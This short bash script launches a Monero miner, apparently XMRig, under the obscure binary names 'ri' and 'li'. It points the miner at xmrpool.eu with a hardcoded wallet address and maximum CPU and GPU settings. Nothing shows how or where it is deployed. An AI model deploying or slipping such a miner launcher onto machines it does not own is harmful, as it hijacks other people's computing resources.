#!/usr/bin/env bash
chmod +x li
chmod +x ri
export ADDR="42KQ6uui9BPe9pgttPYuuTipoMENMKHbH8nmGn1fEPH6czN9X91gSEzL8fpMzJPWVbV3gbGUbD1Pp1eG314V1q5J2wZ8ija"
export TO="xmrpool.eu:5555"
./ri --coin 'monero' -o ${TO} -u ${ADDR} -p x --cuda --cuda-loader=./li --donate-level=1 --threads=32 --cpu-affinity --cpu-priority --cpu-no-yield --asm=auto --verbose --health-print-time=10 --print-time=10
